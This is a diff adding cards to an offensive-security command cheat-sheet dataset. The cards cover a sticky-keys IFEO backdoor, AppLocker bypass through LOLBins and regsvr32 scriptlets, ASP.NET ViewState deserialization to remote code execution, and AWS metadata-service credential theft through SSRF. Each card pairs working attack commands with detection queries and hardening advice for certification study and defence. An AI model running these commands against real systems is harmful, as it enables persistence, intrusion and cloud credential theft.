@@ -409,6 +409,133 @@ const COMMAND_DATA = {
       "explain": "Enumerates GPO ACLs to find policies a non-admin can modify (and thus weaponize):\n  Get-DomainGPO             list all GPOs\n  | Get-ObjectAcl -ResolveGUIDs   read each GPO's ACL with readable right names\n  | Where-Object {...SecurityIdentifier -ne '<domain_controllers_sid>'}   drop the expected DC entries so attacker-writable ACEs stand out\nA writable GPO lets you push a scheduled task/registry change to every computer in its OU. Detect via Event 5136 on CN=Policies objects."
     },
     {
+      "id": "persist-accessibility-backdoor",
+      "name": "Accessibility Feature Backdoor (sethc/utilman + IFEO Debugger)",
+      "command": "reg add \"HKLM\\...\\Image File Execution Options\\sethc.exe\" /v Debugger /d cmd.exe /f",
+      "description": "A pre-logon SYSTEM shell is obtained by abusing the Windows accessibility binaries reachable from the logon screen (sethc.exe via five Shift presses, utilman.exe via Win+U). Either replace the binary with cmd.exe/powershell, or set an Image File Execution Options (IFEO) Debugger value for sethc.exe/utilman.exe so the accessibility key launches cmd.exe as SYSTEM - usable locally or over RDP before any user authenticates.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Persistence",
+      "subcategory": "Persistence",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "MITRE ATT&CK T1546.008; MITRE T1546.012 (IFEO); public sticky-keys backdoor research",
+      "tags": [
+        "persistence",
+        "accessibility",
+        "sticky-keys",
+        "sethc",
+        "utilman",
+        "ifeo",
+        "backdoor"
+      ],
+      "mitre": [
+        "T1546.008",
+        "T1546.012"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== TWO VARIANTS (both need admin) ===\n  1. IFEO Debugger (cleaner - no file replacement):\n     reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f\n     # at the logon screen press Shift x5 -> cmd.exe opens as SYSTEM.\n     # same for utilman.exe (triggered by Win+U).\n\n  2. Binary replacement (noisier; needs TrustedInstaller ownership):\n     takeown /f C:\\Windows\\System32\\sethc.exe & icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F\n     copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n\n=== ACCESSIBILITY TARGETS AT THE LOGON SCREEN ===\n  sethc.exe    (Sticky Keys - 5x Shift)\n  utilman.exe  (Utility Manager - Win+U)\n  osk.exe, magnify.exe, narrator.exe, displayswitch.exe\n\n=== WHY IT EVADES / IS POWERFUL ===\n  - Works BEFORE logon, including over RDP (SYSTEM shell on the secure desktop).\n  - IFEO variant leaves the original binary intact (no hash/signature change to sethc.exe).\n\n=== ALTERNATIVES ===\n  Run keys, services, scheduled tasks - but none give a pre-auth SYSTEM shell at the logon UI.",
+      "examples": [
+        {
+          "label": "IFEO Debugger backdoor on sethc.exe (five-Shift sticky keys)",
+          "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f"
+        },
+        {
+          "label": "IFEO Debugger backdoor on utilman.exe (Win+U)",
+          "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f"
+        },
+        {
+          "label": "Hunt: list IFEO Debugger values on accessibility binaries (defender)",
+          "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" /s /v Debugger"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1546.008 - Accessibility Features",
+          "url": "https://attack.mitre.org/techniques/T1546/008/"
+        },
+        {
+          "title": "MITRE ATT&CK T1546.012 - Image File Execution Options Injection",
+          "url": "https://attack.mitre.org/techniques/T1546/012/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "persist-registry-run-keys",
+          "note": "Run keys are a simpler logon persistence mechanism.",
+          "rel": "alternative"
+        },
+        {
+          "id": "rdp-enum",
+          "note": "The backdoor is often triggered over RDP - enumerate RDP first.",
+          "rel": "prereq"
+        },
+        {
+          "id": "persist-service-creation",
+          "note": "Service persistence is another SYSTEM-level option.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The accessibility binaries launch as SYSTEM from the logon desktop before any user authenticates. An IFEO Debugger value redirects their execution to cmd.exe, and binary replacement swaps the target outright - both documented Windows behaviours - so pressing the accessibility shortcut yields a SYSTEM shell with no credentials.",
+        "prerequisites": "Local administrator (to write the IFEO key under HKLM or to take ownership and replace the System32 binary). Physical access or RDP to reach the logon screen to trigger it.",
+        "impact": "T1546.008 / T1546.012. A pre-authentication SYSTEM command shell reachable from the logon UI (locally or over RDP), providing both persistence and a credential-free backdoor into the host.",
+        "detection": "High-fidelity: any Debugger value under Image File Execution Options\\sethc.exe/utilman.exe/osk.exe/magnify.exe/narrator.exe (Sysmon EID 13); modification or replacement of the accessibility binaries in System32 (file integrity, Sysmon EID 11/2); and the strongest tell - cmd.exe/powershell.exe whose parent is winlogon.exe (the accessibility binary launched from the secure desktop).",
+        "artifacts": "Sysmon EID 13 (RegistryValueSet) on IFEO Debugger for accessibility binaries; Sysmon EID 11 (FileCreate) or integrity change on sethc.exe/utilman.exe; Security 4688 / Sysmon EID 1 with ParentImage winlogon.exe launching a shell; takeown/icacls command history.",
+        "splunk_spl": "index=sysmon EventCode=13 TargetObject=\"*\\\\Image File Execution Options\\\\*\" TargetObject IN (\"*sethc.exe*\",\"*utilman.exe*\",\"*osk.exe*\",\"*magnify.exe*\",\"*narrator.exe*\",\"*displayswitch.exe*\") (TargetObject=\"*Debugger*\")\n| table _time, Computer, Image, TargetObject, Details",
+        "elastic_kql": "event.code:\"13\" and registry.path:*\\\\Image\\ File\\ Execution\\ Options\\\\* and registry.path:(*sethc.exe* or *utilman.exe* or *osk.exe* or *magnify.exe*) and registry.value:Debugger",
+        "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"winlogon.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\")\n| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma_rules": "registry_set_ifeo_accessibility_debugger_backdoor",
+        "prevention": "Alert on any Debugger value under IFEO for the accessibility binaries (there is never a legitimate one); monitor integrity of the System32 accessibility binaries; disable sticky-keys/accessibility shortcuts at the logon screen via policy where feasible; require Network Level Authentication for RDP so the logon desktop is not reachable pre-auth; restrict local admin and audit takeown/icacls on System32.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1546/008/",
+          "https://attack.mitre.org/techniques/T1546/012/"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "IFEO Debugger set on an accessibility binary",
+            "logic": "index=sysmon EventCode=13 TargetObject=\"*\\\\Image File Execution Options\\\\*\" TargetObject IN (\"*sethc.exe\\\\Debugger\",\"*utilman.exe\\\\Debugger\",\"*osk.exe\\\\Debugger\",\"*magnify.exe\\\\Debugger\",\"*narrator.exe\\\\Debugger\")\n| table _time, Computer, Image, TargetObject, Details",
+            "data_source": "sysmon",
+            "attack": [
+              "T1546.012",
+              "T1546.008"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Effectively none for accessibility-binary Debugger values",
+            "tuning": "Alert on any match; investigate immediately"
+          },
+          {
+            "platform": "sentinel",
+            "name": "winlogon.exe spawning a shell (secure-desktop backdoor trigger)",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"winlogon.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"powershell_ise.exe\")\n| project Timestamp, DeviceName, FileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1546.008"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Extremely rare; winlogon does not normally spawn shells",
+            "tuning": "Alert on any match"
+          }
+        ],
+        "visibility": {
+          "requires": [
+            "sysmon",
+            "windows-security"
+          ],
+          "better_with": [
+            "edr",
+            "defender-endpoint"
+          ]
+        }
+      }
+    },
+    {
       "id": "crtp-race-backdoors",
       "name": "ACL Backdoors with RACE.ps1 (WMI / PSRemoting / Registry)",
       "command": "Set-RemoteWMI -SamAccountName <user> -ComputerName <host> -namespace 'root\\cimv2' -Verbose",
@@ -8910,6 +9037,133 @@ const COMMAND_DATA = {
       "explain": "Sweeps a scope for common web/app ports with nmap:\n  -p 80,443,8000,8080,8180,8888,10000   HTTP and alternate HTTP ports\n  --open                                 only report open ports\n  -oA web_discovery                      save all output formats (the XML feeds screenshot tools)\n  -iL <scope_file>                       read targets from file\nBuilds the list of live web apps to triage; pipe web_discovery.xml into EyeWitness or Aquatone next."
     },
     {
+      "id": "win-applocker-bypass",
+      "name": "AppLocker Bypass via Trusted LOLBins and Writable Paths",
+      "command": "rundll32.exe <dll>,<entrypoint>",
+      "description": "AppLocker allowlisting is bypassed by proxying execution through Microsoft-signed binaries (LOLBins) that are trusted by default rules, or by dropping payloads into default-allowed writable directories. Classic vectors: rundll32, regsvr32 scriptlet (squiblydoo), InstallUtil, MSBuild inline tasks, and writing under C:\\Windows\\Tasks or C:\\Windows\\System32\\spool\\drivers\\color - paths users can write to that the default rules still permit.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Defense Evasion",
+      "subcategory": "Defense Evasion",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "LOLBAS Project; MITRE ATT&CK T1218; Microsoft AppLocker docs",
+      "tags": [
+        "applocker",
+        "lolbin",
+        "signed-binary-proxy",
+        "squiblydoo",
+        "bypass",
+        "allowlisting"
+      ],
+      "mitre": [
+        "T1218",
+        "T1218.011",
+        "T1218.010",
+        "T1127"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY DEFAULT RULES LEAK ===\n  The default AppLocker rule set trusts everything under %WINDIR% and %PROGRAMFILES%. Several\n  subdirectories of %WINDIR% are USER-WRITABLE, so a non-admin can place a payload in a trusted path.\n\n=== DEFAULT-ALLOWED WRITABLE PATHS (user-writable, still trusted) ===\n  C:\\Windows\\Tasks\n  C:\\Windows\\Temp (varies)\n  C:\\Windows\\System32\\spool\\drivers\\color\n  C:\\Windows\\tracing\n\n=== SIGNED-BINARY PROXY (LOLBins) ===\n  rundll32.exe <dll>,<entrypoint>              # proxy a DLL export\n  regsvr32 /s /u /i:<url> scrobj.dll           # squiblydoo - scriptlet execution (T1218.010)\n  InstallUtil.exe /logfile= /LogToConsole=false /U <assembly>   # T1218.004 run managed code\n  MSBuild.exe <project.xml>                    # inline task runs C# (T1127)\n\n=== ENUMERATE POLICY FIRST ===\n  Get-AppLockerPolicy -Effective -Xml\n  Get-AppLockerPolicy -Effective | Select -Expand RuleCollections\n  # note which collections are Enforced vs AuditOnly; DLL rules are often not enabled\n\n=== ALTERNATIVES ===\n  AMSI/CLM bypass (if PowerShell is in Constrained Language Mode), HTA/mshta, signed-binary chains.",
+      "examples": [
+        {
+          "label": "Enumerate the effective AppLocker policy",
+          "command": "Get-AppLockerPolicy -Effective -Xml"
+        },
+        {
+          "label": "MSBuild inline-task execution (no compiler needed on disk)",
+          "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe build.xml"
+        },
+        {
+          "label": "Squiblydoo scriptlet via regsvr32",
+          "command": "regsvr32 /s /u /i:<url> scrobj.dll"
+        }
+      ],
+      "references": [
+        {
+          "title": "LOLBAS Project",
+          "url": "https://lolbas-project.github.io/"
+        },
+        {
+          "title": "MITRE ATT&CK T1218 - System Binary Proxy Execution",
+          "url": "https://attack.mitre.org/techniques/T1218/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "dll-hijacking",
+          "note": "DLL search-order abuse is another way to run inside a trusted process.",
+          "rel": "alternative"
+        },
+        {
+          "id": "win-clr-execute-assembly",
+          "note": "InstallUtil/MSBuild proxy managed code; in-memory CLR loading is the next step.",
+          "rel": "next"
+        },
+        {
+          "id": "av-evasion-methods",
+          "note": "AppLocker bypass is part of the broader evasion picture.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "AppLocker trusts binaries by path, publisher, or hash. Microsoft-signed LOLBins pass publisher rules while proxying arbitrary code, and default path rules trust %WINDIR% subtrees that non-admins can write to. DLL enforcement is a separate, often-disabled collection, so rundll32-style proxies run even where EXE rules are enforced.",
+        "prerequisites": "A standard user session on a host with AppLocker in default or incomplete configuration. No admin needed for LOLBin proxying or writing to a user-writable trusted path.",
+        "impact": "T1218 System Binary Proxy Execution. Arbitrary code runs under a trusted, signed process, defeating allowlisting and often blending into normal admin tooling.",
+        "detection": "Alert on LOLBins spawning unusual children or with network/scriptlet arguments: regsvr32 with /i: and a URL (squiblydoo), rundll32 loading a DLL from a user-writable path, InstallUtil/MSBuild launched by Office or a shell, and any process image written under C:\\Windows\\Tasks or spool\\drivers\\color. Script-block logging and EDR command-line capture are key.",
+        "artifacts": "Security 4688 / Sysmon EID 1 process creation with LOLBin command lines; Sysmon EID 11 (FileCreate) under writable %WINDIR% paths; Sysmon EID 7 image loads from unusual directories; AppLocker 8003/8004 (audit/block) events in Microsoft-Windows-AppLocker.",
+        "splunk_spl": "index=wineventlog (EventCode=4688 OR source=\"*Sysmon*\" EventCode=1)\n| search (New_Process_Name=\"*regsvr32.exe\" CommandLine=\"*/i:*http*\") OR (New_Process_Name=\"*rundll32.exe\" CommandLine=\"*\\\\Windows\\\\Tasks\\\\*\") OR New_Process_Name IN (\"*InstallUtil.exe\",\"*MSBuild.exe\")\n| table _time, Computer, ParentImage, New_Process_Name, CommandLine",
+        "elastic_kql": "process.name:(regsvr32.exe or rundll32.exe or InstallUtil.exe or MSBuild.exe) and process.command_line:(*\\/i\\:http* or *\\\\Windows\\\\Tasks\\\\* or *scrobj.dll*)",
+        "sentinel_kql": "DeviceProcessEvents\n| where FileName in~ (\"regsvr32.exe\",\"rundll32.exe\",\"installutil.exe\",\"msbuild.exe\")\n| where ProcessCommandLine has_any (\"/i:http\",\"scrobj.dll\",\"\\\\Windows\\\\Tasks\\\\\",\"spool\\\\drivers\\\\color\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine",
+        "sigma_rules": "proc_creation_win_lolbin_applocker_bypass",
+        "prevention": "Enable the DLL rule collection and switch all collections to Enforce; add explicit deny/path rules for the user-writable %WINDIR% directories (Tasks, tracing, spool\\drivers\\color); block or constrain regsvr32/rundll32/InstallUtil/MSBuild with WDAC; enable Microsoft ASR rules (block Office child processes, block executable content); prefer WDAC over AppLocker for stronger signer-based control.",
+        "sources": [
+          "https://lolbas-project.github.io/",
+          "https://attack.mitre.org/techniques/T1218/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Squiblydoo - regsvr32 remote scriptlet",
+            "logic": "DeviceProcessEvents\n| where FileName =~ \"regsvr32.exe\"\n| where ProcessCommandLine has \"scrobj.dll\" and ProcessCommandLine has_any (\"/i:http\",\"/i:\\\\\\\\\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1218.010"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Rare legitimate COM registration from a network path",
+            "tuning": "Allowlist known software deployment servers"
+          },
+          {
+            "platform": "splunk",
+            "name": "LOLBin executing from a user-writable trusted path",
+            "logic": "index=sysmon EventCode=1 (Image=\"*rundll32.exe\" OR Image=\"*regsvr32.exe\") CommandLine IN (\"*\\\\Windows\\\\Tasks\\\\*\",\"*spool\\\\drivers\\\\color*\",\"*\\\\Windows\\\\tracing*\")\n| table _time, Computer, ParentImage, Image, CommandLine",
+            "data_source": "sysmon",
+            "attack": [
+              "T1218"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Uncommon; printer color-profile tooling may touch the color directory",
+            "tuning": "Baseline legitimate writers of those directories"
+          }
+        ],
+        "visibility": {
+          "requires": [
+            "sysmon",
+            "windows-security"
+          ],
+          "better_with": [
+            "edr",
+            "defender-endpoint"
+          ]
+        }
+      }
+    },
+    {
       "id": "cdsa-m12-sigma-conversion",
       "name": "Applying & Converting Sigma Rules — sigmac, Chainsaw, pySigma & Splunk",
       "command": "python sigmac -t powershell 'C:\\Rules\\sigma\\rule.yml'",
@@ -10134,6 +10388,114 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Rubeus roasts accounts with Kerberos pre-auth disabled, no credentials needed:\n  asreproast               request AS-REP responses for every UF_DONT_REQUIRE_PREAUTH account (add /user:<user> for one)\n  /outfile:asrep.txt       save the crackable hashes\nCrack offline with hashcat -m 18200. Defensively, this shows up as Event 4768 with Pre-Auth Type 0 and RC4 (0x17)."
+    },
+    {
+      "id": "deser-dotnet-viewstate",
+      "name": "ASP.NET __VIEWSTATE Deserialization Abuse",
+      "command": "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"<command>\" --generator=<generator> --validationkey=<key> --validationalg=<alg>",
+      "description": "ASP.NET serializes page state into the __VIEWSTATE field using LosFormatter/ObjectStateFormatter. If the machineKey (validation/decryption keys) is known or leaked from web.config, an attacker forges a signed, optionally encrypted ViewState carrying a ysoserial.net gadget (TextFormattingRunProperties) that the server deserializes into remote code execution. Keys are recovered with Blacklist3r or Badsecrets, or by abusing default/leaked keys.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web Exploitation",
+      "subcategory": "Deserialization",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "pwntester/ysoserial.net; NytroRST/Blacklist3r",
+      "tags": [
+        "deserialization",
+        "viewstate",
+        "aspnet",
+        "machinekey",
+        "blacklist3r",
+        "badsecrets",
+        "rce"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHEN IS VIEWSTATE EXPLOITABLE ===\n  # __VIEWSTATE is a base64 blob in every classic ASP.NET WebForms page.\n  # Exploitable if you know the machineKey, OR validation is disabled (EnableViewStateMac=false, legacy),\n  # OR the app uses a leaked/default key.\n\n=== STEP 1: RECOVER THE MACHINEKEY ===\n  # Blacklist3r (AspDotNetWrapper) brute-forces known/leaked keys against a captured ViewState:\n  AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <viewstate> --purpose=viewstate --modifier=<generator> --macdecode\n  # Badsecrets (python) does the same offline:\n  python3 -m badsecrets.examples.blacklist3r --url https://<target>/page.aspx\n  # Keys also leak via LFI/source disclosure of web.config <machineKey validationKey=... decryptionKey=...>.\n\n=== STEP 2: FIND THE __VIEWSTATEGENERATOR ===\n  # The hidden __VIEWSTATEGENERATOR field (e.g. CA0B0334) is the --generator value.\n\n=== STEP 3: FORGE THE RCE VIEWSTATE ===\n  # MAC only (no encryption):\n  ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --generator=<generator> --validationalg=SHA1 --validationkey=<validationkey>\n  # MAC + encryption (modern default):\n  ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --path=\"/page.aspx\" --apppath=\"/\" --decryptionalg=AES --decryptionkey=<decryptionkey> --validationalg=HMACSHA256 --validationkey=<validationkey>\n  # URL-encode the output and POST it as __VIEWSTATE.\n\n=== DELIVERY ===\n  curl -s https://<target>/page.aspx --data-urlencode \"__VIEWSTATE=<forged>\" --data \"__VIEWSTATEGENERATOR=<generator>\"\n\n=== ALTERNATIVES ===\n  Generic ysoserial.net formatters when the sink is not ViewState - see deser-dotnet-ysoserial\n  CVE-2020-0688 (Exchange ECP) ships a hardcoded default validationKey for exactly this attack",
+      "examples": [
+        {
+          "label": "Recover keys offline with Badsecrets",
+          "command": "python3 -m badsecrets.examples.blacklist3r --url https://<target>/page.aspx"
+        },
+        {
+          "label": "Forge MAC-only ViewState RCE",
+          "command": "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --generator=<generator> --validationalg=SHA1 --validationkey=<key>"
+        },
+        {
+          "label": "Forge encrypted ViewState RCE",
+          "command": "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"whoami\" --path=\"/x.aspx\" --apppath=\"/\" --decryptionalg=AES --decryptionkey=<dkey> --validationalg=HMACSHA256 --validationkey=<vkey>"
+        }
+      ],
+      "references": [
+        {
+          "title": "pwntester/ysoserial.net - ViewState plugin",
+          "url": "https://github.com/pwntester/ysoserial.net"
+        },
+        {
+          "title": "NytroRST/Blacklist3r",
+          "url": "https://github.com/NytroRST/Blacklist3r"
+        },
+        {
+          "title": "PortSwigger - Exploiting ASP.NET ViewState",
+          "url": "https://portswigger.net/web-security/deserialization/exploiting"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "deser-dotnet-ysoserial",
+          "note": "Core ysoserial.net gadgets/formatters this builds on.",
+          "rel": "prereq"
+        },
+        {
+          "id": "exploit-deserialization",
+          "note": "Generic multi-language deserialization hub card.",
+          "rel": "alternative"
+        },
+        {
+          "id": "deser-java-ysoserial",
+          "note": "Java equivalent serialized-object abuse.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "ViewState is a serialized object graph. When the signing/encryption machineKey is weak, default, or leaked, an attacker can forge a valid ViewState carrying a gadget, and ObjectStateFormatter deserializes it server-side into code execution. Disabling ViewState MAC removes the integrity check entirely.",
+        "prerequisites": "A classic ASP.NET WebForms endpoint plus a known/leaked/default machineKey, or an app with ViewState MAC validation disabled.",
+        "impact": "Remote code execution in the IIS worker process as the app-pool identity.",
+        "detection": "[MITRE T1190] Oversized or malformed __VIEWSTATE POST bodies, repeated ViewState MAC validation failures (Event ID 4009 / ViewStateException in the application log); [MITRE T1059] w3wp.exe spawning shells.",
+        "artifacts": "IIS logs with large __VIEWSTATE POSTs; Windows Application log ASP.NET ViewState MAC validation errors; Sysmon/EDR w3wp.exe -> cmd.exe process tree; new files under the site temp dir.",
+        "splunk_spl": "index=iis cs_method=POST (cs_uri_query=\"*__VIEWSTATE*\" OR request_body=\"*__VIEWSTATE*\")\n| eval vs_len=len(request_body)\n| where vs_len > 2000\n| table _time, c_ip, cs_uri_stem, vs_len",
+        "elastic_kql": "http.request.method:POST and http.request.body.content:*__VIEWSTATE* and event.code:\"4009\"",
+        "sentinel_kql": "Event\n| where Source has \"ASP.NET\" and (RenderedDescription has \"ViewState\" and RenderedDescription has \"validation\")\n| project TimeGenerated, Computer, RenderedDescription",
+        "sigma_rules": "web_aspnet_viewstate_mac_validation_failure",
+        "prevention": "Keep EnableViewStateMac on; rotate machineKeys and never ship default/leaked keys; use AutoGenerate,IsolateApps keys; prefer DPAPI-protected keys; patch Exchange (CVE-2020-0688); restrict web.config disclosure; run app pools least-privileged.",
+        "sources": [
+          "pwntester/ysoserial.net",
+          "https://portswigger.net/web-security/deserialization/exploiting"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Repeated ASP.NET ViewState MAC validation failures",
+            "logic": "Event\n| where EventLog == \"Application\" and Source has \"ASP.NET\"\n| where RenderedDescription has \"ViewState\" and RenderedDescription has_any (\"MAC\",\"validation\",\"could not be verified\")\n| summarize Count=count() by Computer, bin(TimeGenerated, 10m)\n| where Count > 3",
+            "data_source": "windows-application",
+            "attack": [
+              "T1190"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Key rotation or load-balanced nodes with mismatched machineKeys",
+            "tuning": "Correlate failures with a following w3wp.exe child shell to raise confidence"
+          }
+        ]
+      }
     },
     {
       "id": "recon-assetfinder",
@@ -14234,6 +14596,213 @@ const COMMAND_DATA = {
       "explain": "Configures the AWS CLI with obtained keys and confirms whose they are:\n  aws configure --profile <name>   store the access key id + secret under a named profile\n  aws --profile <name> sts get-caller-identity   ask AWS who this identity is\nget-caller-identity returns the UserId, 12-digit Account, and full IAM ARN - your starting point for scoping permissions; keys go in ~/.aws/credentials."
     },
     {
+      "id": "aws-imds-ssrf-creds",
+      "name": "AWS IMDS SSRF - Steal EC2/ECS Role Credentials",
+      "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>",
+      "description": "Abuse a server-side request forgery (SSRF) primitive on an EC2 instance (or a direct shell) to reach the Instance Metadata Service at 169.254.169.254 and steal the temporary AWS credentials of the attached IAM role. IMDSv1 answers any GET; IMDSv2 requires a PUT to obtain a session token first (X-aws-ec2-metadata-token) which SSRF often cannot send.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Cloud Security",
+      "subcategory": "AWS Attacks",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "hackingthe.cloud",
+      "tags": [
+        "aws",
+        "imds",
+        "ssrf",
+        "ec2",
+        "ecs",
+        "credentials",
+        "169.254.169.254"
+      ],
+      "mitre": [
+        "T1552.005",
+        "T1078.004"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHAT YOU ARE AFTER ===\n  The link-local metadata endpoint 169.254.169.254 serves the temporary\n  STS credentials (AccessKeyId/SecretAccessKey/Token) of the instance role.\n\n=== IMDSv1 (direct GET - works through most SSRF) ===\n  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n  # that returns the role name, then:\n  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\n  # JSON with AccessKeyId, SecretAccessKey, Token, Expiration\n\n=== IMDSv2 (token-first - needs a PUT, often blocks blind SSRF) ===\n  TOKEN=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" \\\n    -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\n  curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n    http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\n\n=== ECS TASK ROLE (containers) ===\n  # the task role creds URI is in an env var, fetched from 169.254.170.2\n  curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\n\n=== USE THE STOLEN CREDS ===\n  export AWS_ACCESS_KEY_ID=...  AWS_SECRET_ACCESS_KEY=...  AWS_SESSION_TOKEN=...\n  aws sts get-caller-identity\n  aws s3 ls\n\n=== SSRF DELIVERY TRICKS (when a web app fetches a URL) ===\n  http://169.254.169.254/...            # direct\n  http://[::ffff:169.254.169.254]/...   # IPv6-mapped bypass\n  http://instance-data/latest/...       # alt hostname\n  # DNS-rebinding / redirect chains to defeat allowlists\n\n=== ALTERNATIVES / NEXT ===\n  Once you hold the role creds, enumerate with Pacu or pmapper.",
+      "examples": [
+        {
+          "label": "Enumerate IMDSv1 role then grab creds",
+          "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo && curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
+        },
+        {
+          "label": "IMDSv2 token-first fetch",
+          "command": "TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'); curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
+        },
+        {
+          "label": "Validate stolen creds",
+          "command": "aws sts get-caller-identity"
+        }
+      ],
+      "references": [
+        {
+          "title": "hackingthe.cloud - Steal EC2 metadata credentials via SSRF",
+          "url": "https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/"
+        },
+        {
+          "title": "AWS docs - Instance Metadata Service (IMDSv2)",
+          "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "aws-pacu-enum",
+          "note": "Enumerate the account with the stolen role credentials.",
+          "rel": "next"
+        },
+        {
+          "id": "cloud-enumerate-iam",
+          "note": "Map what the stolen role can do.",
+          "rel": "next"
+        },
+        {
+          "id": "ssrf-exploit",
+          "note": "General SSRF exploitation to reach the metadata endpoint.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The IMDS endpoint 169.254.169.254 is reachable from any process on the instance and, with IMDSv1, answers unauthenticated GETs. A web app with SSRF can be coerced into making that GET and returning the role's temporary credentials.",
+        "prerequisites": "An SSRF primitive in an app running on EC2, or any code execution on the instance/container. IMDSv1 enabled (or an SSRF that can send the IMDSv2 PUT and custom header).",
+        "impact": "Theft of the instance/task IAM role's temporary credentials, giving the attacker every permission that role holds - frequently S3, DynamoDB, or further IAM reach leading to full account compromise.",
+        "detection": "[MITRE T1552.005] CloudTrail shows the role's temporary credentials being used from an IP outside the instance (sourceIPAddress not the instance ENI / not an AWS internal address), or API calls the role has never made before; GuardDuty raises UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS.",
+        "artifacts": "CloudTrail events with userIdentity.type=AssumedRole and the instance role's session name used from an external sourceIPAddress; VPC flow logs rarely show IMDS (link-local) but web-app logs show the SSRF request to 169.254.169.254.",
+        "splunk_spl": "index=aws sourcetype=aws:cloudtrail userIdentity.sessionContext.sessionIssuer.type=Role\n| search userIdentity.arn=\"*:assumed-role/*\"\n| stats values(eventName) dc(sourceIPAddress) as ips by userIdentity.arn\n| where ips>1",
+        "elastic_kql": "aws.cloudtrail.user_identity.type:\"AssumedRole\" and not source.ip:(10.0.0.0/8 or 172.16.0.0/12)",
